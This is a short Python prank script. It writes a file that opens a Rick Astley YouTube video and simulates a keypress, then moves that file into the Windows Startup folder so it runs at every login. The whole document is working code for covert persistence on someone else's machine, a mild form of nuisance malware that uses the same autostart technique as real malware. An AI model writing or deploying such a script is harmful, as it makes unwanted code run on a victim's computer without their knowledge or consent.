import os
import time



# create a new file
file = open("rickroll.py", "w")

# write the code
file.write("""
import webbrowser

import time

import keyboard

url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'

webbrowser.open(url)

time.sleep(20)

keyboard.press('k')

keyboard.release('k')
""")

# close the file
file.close()


import shutil

current_dir = os.getcwd()
print(current_dir)
# get the path to the file that the user wants to move
file_path = current_dir + "\\rickroll.py"

# get the path to the startup directory
startup_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# move the file into the startup directory
shutil.move(file_path, startup_path)


